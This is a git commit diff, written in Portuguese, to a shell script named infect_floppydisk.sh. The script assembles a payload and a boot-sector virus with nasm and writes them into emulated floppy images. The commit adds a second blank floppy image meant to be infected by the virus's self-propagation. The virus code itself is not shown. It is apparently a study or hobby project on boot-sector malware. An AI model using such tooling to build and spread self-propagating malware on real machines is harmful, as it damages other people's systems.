81a125f0ca60c3033a5d009d849fd8e1ee142cb7
Marcos <marcos.gabriel@ossirian.com>
2023-10-03 11:09:54 -0300

    new: criação de segundo floppy disk vazio

--- src/virus/infect_floppydisk.sh
+++ src/virus/infect_floppydisk.sh
@@ -1,6 +1,8 @@
 nasm -f bin payload.asm -o ../../bin/payload.bin
 nasm -f bin virus.asm -o ../../bin/virus.bin
 
-dd if=/dev/zero of=../../build/floppy.flp bs=512 count=2880 # Criação do FloppyDisk
+dd if=/dev/zero of=../../build/floppy.flp bs=512 count=2880 # Criação do FloppyDisk Principal
+dd if=/dev/zero of=../../build/floppy_2.flp bs=512 count=2880 # Criação do FloppyDisk que será infectado por autopropagação.
+
 dd if=../../bin/payload.bin of=../../build/floppy.flp bs=512 count=1 conv=notrunc seek=1 # Inserção do Payload
 dd if=../../bin/virus.bin of=../../build/floppy.flp bs=512 count=1 conv=notrunc # Inserção do virus
